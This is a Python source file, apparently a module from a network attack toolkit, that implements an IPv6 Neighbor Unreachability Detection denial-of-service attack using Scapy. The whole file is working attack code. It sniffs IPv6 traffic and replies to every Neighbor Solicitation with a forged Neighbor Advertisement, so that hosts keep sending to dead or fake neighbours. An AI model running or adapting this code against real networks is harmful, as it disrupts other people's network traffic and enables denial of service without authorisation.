from scapy.all import *
from threading import Thread
from dos import DoS
import util

"""Exploits a flaw in the Neighbor Unreachability Detection (NUD) mechanism 
   in the NDP IPv6 suite.  This will listen for unicast Neighbor Solicitations
   and respond, no matter if the dest node is alive or not.  In the event that a node
   is down, or fake node entries are present in the system's cache, the host will
   continue to send packets because NUD has not had a chance to remediate the issue.

   Enabling a sniffer will allow you to view all sent data.
"""
class nud(DoS):
	def __init__(self):
		self.running = False
		self.dump = False
		super(nud,self).__init__('IPv6 Neighbor Unreachability Detection DoS')

	def initialize(self):
		"""initialize the NUD dos"""
		util.Msg('Starting NUD DoS listener...')	
		self.running = True
		dthread = Thread(target=self.listener)
		dthread.start()
		return 'NuD DoS Listener'

	def handler(self, pkt):
		"""Listen for neighbor solicitations"""
		if ICMPv6ND_NS in pkt:
			v6_type = pkt[ICMPv6ND_NS].type
			if v6_type is 135: 
				# respond
	  			npkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst)
				npkt /= ICMPv6ND_NA()
				send(npkt, count=1)
				if self.dump: util.Msg('Responded to %s'%pkt[IPv6].src)
	
	def stop_caller(self):
		"""Sniffer callback"""
		if self.running:
			return True
		util.debug('NUDDos shutting down..')
		return False

	def listener(self):
		"""listen for IPv6 packets"""
		try:
			while self.running:
				sniff(filter='ip6', store=0, prn=self.handler,
								stopper=self.stop_caller,stopperTimeout=3)
		except Exception, e:
			util.Error('%s'%e)

	def shutdown(self):
		"""Shutdown"""
		if self.running:
			self.running = False
		return True

	def view(self):
		util.Msg('NUD DoS...')
		self.dump = True
		raw_input()
		self.dump = False
		return
